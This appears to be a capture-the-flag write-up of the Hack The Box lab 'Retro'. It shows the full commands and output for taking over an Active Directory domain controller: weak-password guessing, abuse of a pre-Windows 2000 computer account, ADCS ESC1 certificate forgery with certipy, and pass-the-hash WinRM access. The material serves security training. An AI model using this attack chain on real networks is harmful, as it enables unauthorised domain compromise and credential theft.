---
icon: chair-office
cover: ../../../../.gitbook/assets/Screenshot 2026-02-04 221733.png
coverY: 0
---

# HTB-RETRO(VL)

#### Attack Flow

```
SMB Guest Enumeration → Trainee Share Discovery
    ↓
Password Guessing (trainee:trainee) → Notes Share Access
    ↓
Pre-Windows 2000 Account Discovery (BANKING$:banking)
    ↓
Password Change via RPC-SAMR → BANKING$ Access
    ↓
ADCS ESC1 Vulnerability → Administrator Certificate Request
    ↓
Certificate Authentication → Administrator NTLM Hash
    ↓
WinRM with Pass-the-Hash → Domain Admin
```

***

### Reconnaissance

#### Initial Port Scan

I started with Rustscan to identify all open ports on the target.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ rustscan -a 10.121.224.17 -- -sCV
```

**Results - 22 Open Ports:**

**Key Services:**

* **53/tcp** - DNS (Simple DNS Plus)
* **88/tcp** - Kerberos (Microsoft Windows Kerberos)
* **135/tcp** - MSRPC
* **139/tcp** - NetBIOS-SSN
* **389/tcp** - LDAP (Active Directory)
* **445/tcp** - SMB (Microsoft-DS)
* **464/tcp** - Kpasswd5
* **593/tcp** - RPC over HTTP
* **636/tcp** - LDAPS (SSL/LDAP)
* **3268/tcp** - Global Catalog LDAP
* **3269/tcp** - Global Catalog LDAPS
* **3389/tcp** - RDP (Microsoft Terminal Services)
* **5357/tcp** - WSD API
* **5985/tcp** - WinRM
* **9389/tcp** - ADWS (.NET Message Framing)
* Multiple high ports (49664-56930)

**Key Findings:**

* **Windows Server 2022 Build 20348** (Domain Controller)
* **Domain:** retro.vl
* **Hostname:** DC.retro.vl
* **SMB signing:** Enabled and required
* **Clock skew:** +12m17s from scanner time

#### Hosts File Configuration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb 10.121.224.17 --generate-hosts-file hosts
SMB         10.121.224.17   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)

┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ cat hosts /etc/hosts | sponge /etc/hosts
```

***

### Enumeration

#### SMB Enumeration (Port 445)

**Initial anonymous enumeration failed:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl --shares
SMB         10.121.224.17   445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

**Guest account worked:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u guest -p '' --shares
SMB         10.121.224.17   445    DC               [+] retro.vl\guest: 
SMB         10.121.224.17   445    DC               [*] Enumerated shares
SMB         10.121.224.17   445    DC               Share           Permissions     Remark
SMB         10.121.224.17   445    DC               -----           -----------     ------
SMB         10.121.224.17   445    DC               ADMIN$                          Remote Admin
SMB         10.121.224.17   445    DC               C$                              Default share
SMB         10.121.224.17   445    DC               IPC$            READ            Remote IPC
SMB         10.121.224.17   445    DC               NETLOGON                        Logon server share
SMB         10.121.224.17   445    DC               Notes                           
SMB         10.121.224.17   445    DC               SYSVOL                          Logon server share
SMB         10.121.224.17   445    DC               Trainees        READ
```

**Critical findings:**

* **Notes** share (no guest access)
* **Trainees** share (guest READ access)

#### Trainees Share Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ smbclient //dc.retro.vl/Trainees -U 'guest%'

smb: \> ls
  .                                   D        0  Sun Jul 23 21:58:43 2023
  ..                                DHS        0  Wed Apr  9 03:16:04 2025
  Important.txt                       A      288  Sun Jul 23 22:00:13 2023

smb: \> get Important.txt
```

**Important.txt contents:**

```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords. So we decided to bundle every one of you up into one account. Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

**Key insight:** All trainees share one account with likely a weak password!

#### User Enumeration via RID Cycling

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u guest -p '' --rid-brute
SMB         10.121.224.17   445    DC               [+] retro.vl\guest: 
SMB         10.121.224.17   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.121.224.17   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.121.224.17   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.121.224.17   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.121.224.17   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.121.224.17   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.121.224.17   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.121.224.17   445    DC               1109: RETRO\tblack (SidTypeUser)
```

**Critical discoveries:**

* **trainee** user (matches the note)
* **BANKING$** computer account (unusual)

***

### Initial Access - Trainee Account

#### Password Guessing

Based on the note about trainees having weak passwords, I attempted the username as password:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u trainee -p trainee
SMB         10.121.224.17   445    DC               [+] retro.vl\trainee:trainee
```

**Credentials obtained:**

* **Username:** trainee
* **Password:** trainee

#### Authenticated SMB Access

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u trainee -p trainee --shares
SMB         10.121.224.17   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.121.224.17   445    DC               Share           Permissions     Remark
SMB         10.121.224.17   445    DC               Notes           READ
SMB         10.121.224.17   445    DC               NETLOGON        READ
SMB         10.121.224.17   445    DC               SYSVOL          READ
SMB         10.121.224.17   445    DC               Trainees        READ
```

Now we have READ access to the **Notes** share!

#### Notes Share Analysis

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ smbclient //dc.retro.vl/Notes -U 'trainee%trainee'

smb: \> ls
  .                                   D        0  Wed Apr  9 03:12:49 2025
  ..                                DHS        0  Wed Apr  9 03:16:04 2025
  ToDo.txt                            A      248  Sun Jul 23 22:05:56 2023
  user.txt                            A       32  Wed Apr  9 03:13:01 2025

smb: \> get user.txt
smb: \> get ToDo.txt
```

#### ToDo.txt Contents

```
Thomas,

after convincing the finance department to get rid of their ancient banking software
it is finally time to clean up the mess they made. We should start with the pre created computer account. That one is older than me.

Best

James
```

**Critical clues:**

* "pre created computer account" → BANKING$
* "older than me" → Pre-Windows 2000 computer account
* Pre-Windows 2000 accounts use hostname (lowercase) as password!

***

### Lateral Movement - BANKING$ Account

#### Understanding Pre-Windows 2000 Computer Accounts

Pre-Windows 2000 computer accounts have a well-known password pattern:

* **Password = hostname in lowercase**
* For BANKING$, password would be: **banking**

#### Validating Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u 'BANKING$' -p banking
SMB         10.121.224.17   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

**STATUS\_NOLOGON\_WORKSTATION\_TRUST\_ACCOUNT** = Correct password, but account hasn't been used yet!

#### Method 1: Password Change via RPC

The error indicates the password is correct but we need to change it to use the account:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ changepasswd.py -newpass 'Sn0x123!@#' 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

**Verification:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u 'BANKING$' -p 'Sn0x123!@#'
SMB         10.121.224.17   445    DC               [+] retro.vl\BANKING$:Sn0x123!@#
```

#### Method 2: Kerberos Authentication (Alternative)

An alternative approach is using Kerberos authentication directly:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ netexec smb dc.retro.vl -u 'BANKING$' -p banking -k
SMB         dc.retro.vl     445    DC               [+] retro.vl\BANKING$:banking
```

This bypasses the SMB authentication issue entirely!

***

### Privilege Escalation - ADCS ESC1

#### Certificate Services Enumeration

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ certipy find -u 'BANKING$@retro.vl' -p 'Sn0x123!@#' -vulnerable -stdout
```

**Key findings:**

**Certificate Authority:**

* **CA Name:** retro-DC-CA
* **DNS Name:** DC.retro.vl
* **Active and issuing certificates**

**Vulnerable Template - RetroClients:**

```
Template Name                       : RetroClients
Display Name                        : Retro Clients
Client Authentication               : True
Enrollee Supplies Subject           : True ← CRITICAL
Certificate Name Flag               : EnrolleeSuppliesSubject
Extended Key Usage                  : Client Authentication
Minimum RSA Key Length              : 4096
Enrollment Rights                   : RETRO.VL\Domain Admins
                                      RETRO.VL\Domain Computers ← BANKING$ is here!
                                      RETRO.VL\Enterprise Admins
[!] Vulnerabilities
  ESC1                              : Enrollee supplies subject and template allows client authentication.
```

#### ESC1 Vulnerability Explained

**Three critical misconfigurations:**

1. **Enrollee Supplies Subject** - Requester can specify ANY user in the certificate
2. **Client Authentication EKU** - Certificate can be used for Kerberos authentication
3. **Domain Computers can enroll** - BANKING$ has enrollment rights!

This allows us to request a certificate for **any user** (like Administrator)!

#### Exploitation - Requesting Administrator Certificate

**First attempt (failed - key size too small):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ certipy req -u 'BANKING$@retro.vl' -p 'Sn0x123!@#' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl
[*] Requesting certificate via RPC
[-] Got error: CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required
```

**Template requires 4096-bit RSA key!**

**Second attempt (with correct key size):**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ certipy req -u 'BANKING$@retro.vl' -p 'Sn0x123!@#' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
```

#### Authentication Attempt

#### Obtaining Administrator SID

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ lookupsid.py retro.vl/BANKING$:'Sn0x123!@#'@dc.retro.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
500: RETRO\Administrator (SidTypeUser)
```

**Administrator SID:** S-1-5-21-2983547755-698260136-4283918172-500

#### Requesting Certificate with SID

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ certipy req -u 'BANKING$@retro.vl' -p 'Sn0x123!@#' -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

#### Authenticating as Administrator

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.121.224.17
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

**Administrator NTLM hash obtained:** 252fac7066d93dd009d4fd2cd0368389

***

### Domain Admin Access

#### WinRM Shell

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Retro]
└─$ evil-winrm-py -i dc.retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v0.0.8
[*] Connecting to dc.retro.vl:5985 as administrator
evil-winrm-py PS C:\Users\Administrator\Documents>
```

***
